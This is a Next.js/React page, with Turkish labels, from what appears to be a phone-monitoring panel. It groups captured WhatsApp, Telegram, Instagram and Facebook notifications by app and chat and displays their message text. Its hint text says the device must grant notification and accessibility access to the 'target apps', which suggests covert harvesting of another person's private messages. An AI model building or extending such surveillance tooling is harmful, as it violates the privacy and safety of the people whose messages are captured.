'use client';

import { Suspense, useMemo } from 'react';
import { api, NotificationItem, formatDate } from '@/lib/api';
import { useDevicePage } from '@/hooks/useDevicePage';
import { DataActions } from '@/components/DataActions';
import { PageShell } from '@/components/ui/PageShell';
import { LoadingSkeleton } from '@/components/ui/LoadingSkeleton';

const SOCIAL_APPS: Record<string, { name: string; icon: string; color: string }> = {
  'com.whatsapp': { name: 'WhatsApp', icon: '💚', color: 'from-emerald-500 to-green-600' },
  'com.whatsapp.w4b': { name: 'WhatsApp Business', icon: '💼', color: 'from-emerald-600 to-teal-600' },
  'org.telegram.messenger': { name: 'Telegram', icon: '✈️', color: 'from-sky-500 to-blue-600' },
  'com.instagram.android': { name: 'Instagram', icon: '📸', color: 'from-pink-500 to-purple-600' },
  'com.facebook.katana': { name: 'Facebook', icon: '👤', color: 'from-blue-600 to-indigo-600' },
  'com.facebook.orca': { name: 'Messenger', icon: '💬', color: 'from-blue-500 to-violet-600' },
};

function matchSocial(pkg: string) {
  const key = Object.keys(SOCIAL_APPS).find((k) => pkg.startsWith(k));
  return key ? SOCIAL_APPS[key] : { name: pkg, icon: '📱', color: 'from-gray-500 to-gray-600' };
}

function SocialContent() {
  const page = useDevicePage<NotificationItem>(api.getSocial);

  const grouped = useMemo(() => {
    const map = new Map<string, Map<string, NotificationItem[]>>();
    for (const n of page.data) {
      const appKey = Object.keys(SOCIAL_APPS).find((k) => n.appPackage.startsWith(k)) || n.appPackage;
      if (!map.has(appKey)) map.set(appKey, new Map());
      const chats = map.get(appKey)!;
      const chatTitle = n.title || 'Genel';
      if (!chats.has(chatTitle)) chats.set(chatTitle, []);
      chats.get(chatTitle)!.push(n);
    }
    return map;
  }, [page.data]);

  return (
    <PageShell
      title="Sosyal Medya"
      subtitle="WhatsApp, Telegram, Instagram, Facebook sohbetleri ve bildirimleri"
      emptyTitle="Sosyal medya kaydı yok"
      emptyHint="Bildirim erişimi ve erişilebilirlik açık olmalı. Hedef uygulamalarda mesaj gelince burada görünür."
      isEmpty={page.data.length === 0}
      skeleton={<LoadingSkeleton rows={4} />}
      extraFilters={
        <DataActions deviceId={page.selectedDevice} dataType="notifications" onChanged={page.onRefresh} />
      }
      {...page}
    >
      <div className="space-y-8">
        {Array.from(grouped.entries()).map(([appKey, chats]) => {
          const meta = matchSocial(appKey);
          return (
            <section key={appKey}>
              <div className={`social-app-header bg-gradient-to-r ${meta.color}`}>
                <span className="text-2xl">{meta.icon}</span>
                <div>
                  <h2 className="font-bold text-lg">{meta.name}</h2>
                  <p className="text-sm text-white/80">{chats.size} sohbet · {page.data.filter((d) => d.appPackage.startsWith(appKey)).length} mesaj</p>
                </div>
              </div>

              <div className="space-y-6">
                {Array.from(chats.entries()).map(([chatTitle, messages]) => (
                  <div key={chatTitle} className="card">
                    <h3 className="font-semibold mb-3 flex items-center gap-2">
                      <span className="w-8 h-8 rounded-full bg-indigo-100 text-indigo-700 flex items-center justify-center text-sm">
                        {chatTitle.charAt(0).toUpperCase()}
                      </span>
                      {chatTitle}
                    </h3>
                    <div className="space-y-2 max-h-[420px] overflow-y-auto pr-1">
                      {messages.map((m) => (
                        <div key={m.id} className="chat-bubble-in">
                          {m.text && <p className="break-words whitespace-pre-wrap">{m.text}</p>}
                          {!m.text && m.title && <p className="break-words">{m.title}</p>}
                          <p className="text-[10px] text-gray-400 mt-2 text-right">{formatDate(m.timestamp)}</p>
                        </div>
                      ))}
                    </div>
                  </div>
                ))}
              </div>
            </section>
          );
        })}
      </div>
    </PageShell>
  );
}

export default function SocialPage() {
  return (
    <Suspense fallback={<LoadingSkeleton />}>
      <SocialContent />
    </Suspense>
  );
}
